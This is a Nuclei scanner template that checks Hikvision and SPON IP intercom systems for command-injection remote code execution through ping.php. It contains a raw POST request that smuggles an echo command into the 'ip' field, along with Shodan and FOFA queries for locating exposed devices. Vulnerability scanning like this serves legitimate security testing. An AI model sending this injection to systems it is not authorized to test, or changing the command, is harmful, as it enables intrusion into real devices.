id: hikvision-spon-group-intercom-ping-rce
info:
  name: hikvision 群组对讲服务配置平台 or 世邦通信 SPON IP 网络对讲广播系统 ping.php - rce
  author: DhiyaneshDk,archer
  severity: critical
  description: 
  reference:
    - https://github.com/luck-ying/Library-POC/blob/master/SPON_IP%E7%BD%91%E7%BB%9C%E5%AF%B9%E8%AE%B2%E5%B9%BF%E6%92%AD%E7%B3%BB%E7%BB%9F/SPON%20IP%E7%BD%91%E7%BB%9C%E5%AF%B9%E8%AE%B2%E5%B9%BF%E6%92%AD%E7%B3%BB%E7%BB%9F%20ping.php%20RCE.py
  metadata:
    verified: true
    shodan-query: http.favicon.hash:"-1830859634"
    fofa-query: icon_hash="-1830859634" || body="js/jquery.breadcrumbs.ex.js"
  tags: 2021,spon,rce,hikvision

http:
  - raw:
      - |
        POST /php/ping.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Origin: {{RootURL}}
        Connection: close
        Referer: {{RootURL}}/html/system.html
        X-Forwarded-For: 127.0.0.1

        jsondata[type]=3&jsondata[ip]=echo+{{randstr}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body,'{{randstr}}')
        condition: and